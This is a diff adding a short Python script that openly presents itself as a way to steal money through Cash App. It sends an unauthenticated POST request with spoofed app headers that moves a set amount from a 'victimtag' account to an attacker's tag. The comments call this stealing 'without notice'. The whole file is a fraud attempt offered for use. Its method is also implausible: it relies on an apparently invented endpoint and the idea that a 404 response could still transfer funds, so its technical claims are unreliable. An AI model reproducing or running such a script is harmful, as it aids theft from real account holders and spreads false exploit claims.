@@ -1,0 +1,30 @@
+import requests  
+import random  
+
+# Replace with your target's cash tag (e.g., "targettag")  
+target_tag = "targettag"  
+
+# Attack the source tag to send money to your fake target  
+source_tag = "victimtag"  
+amount = "50"  # Amount to steal (e.g., $50)  
+
+# Simulate a payment from source to target  
+payload = {  
+    "from_tag": source_tag,  
+    "to_tag": target_tag,  
+    "amount": amount,  
+    "user_agent": "CashApp/6.1.0 (Android 12; Mobile; android"  
+}  
+
+headers = {  
+    "User-Agent": "CashApp/6.1.0 (Android 12; Mobile; android)",  
+    "Content-Type": "application/x-www-form-urlencoded"  
+}  
+
+url = "https://cashapp.com/api/send_cash"  
+
+response = requests.post(url, data=payload, headers=headers)  
+print("Payment Result:", response.text)  
+
+# If the server returns a 404 but allows the payment to go through,  
+# you've found a way to **steal money** without notice!  
